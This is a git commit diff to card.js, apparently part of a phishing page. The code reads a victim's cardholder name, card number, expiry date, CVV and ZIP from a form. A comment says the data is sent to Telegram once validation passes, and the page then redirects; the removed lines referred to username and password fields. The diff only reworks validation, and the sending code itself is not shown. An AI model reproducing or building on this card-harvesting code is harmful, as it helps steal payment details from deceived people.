e159d47507355fcf89487609f3bfe397d4bc01cf
Muraina Ayodeji <murainaayodeji10@gmail.com>
2025-02-27 17:26:30 -0500

    working

--- card.js
+++ card.js
@@ -1,24 +1,29 @@
 function cardContinue(){
-    let isValid = true
-
     const cardHolder = document.getElementById("cardholder")
     const cardNumber = document.getElementById("cardnumber")
     const expiry = document.getElementById("expiry")
     const cvv = document.getElementById("cvv")
     const zip = document.getElementById("zip")
+    let isValid = true
 
     if(cardHolder.value == "" || cardNumber.value == "" || expiry.value == "" || cvv.value == "" || zip.value == ""){
         document.getElementById("cardError").style.display = "block"
+        isValid = false
         document.getElementById("cardnumberError").style.display = "block"
+        isValid = false
         document.getElementById("expiryError").style.display = "block"
+        isValid = false
         document.getElementById("cvvError").style.display = "block"
+        isValid = false
         document.getElementById("zipError").style.display = "block"
+        isValid = false
     }else{
         document.getElementById("cardError").style.display = "none"
         document.getElementById("cardnumberError").style.display = "none"
         document.getElementById("expiryError").style.display = "none"
         document.getElementById("cvvError").style.display = "none"
         document.getElementById("zipError").style.display = "none"
+        // isValid = false
     }
     if(isValid){
         //  If validation passes, send data to Telegram
@@ -44,13 +49,14 @@ function cardContinue(){
         setTimeout(()=>{
             window.location.href = "redirect.html"
         }, 2000)
-    }else {
-        if (userName.value.trim() == "") {
-            document.getElementById("userError").style.display = "block"
-        }
-        if (passWord.value.trim() == "") {
-            document.getElementById("passError").style.display = "block"
-        }
     }
+    // else {
+    //     if (userName.value.trim() == "") {
+    //         document.getElementById("userError").style.display = "block"
+    //     }
+    //     if (passWord.value.trim() == "") {
+    //         document.getElementById("passError").style.display = "block"
+    //     }
+    // }
     
 }
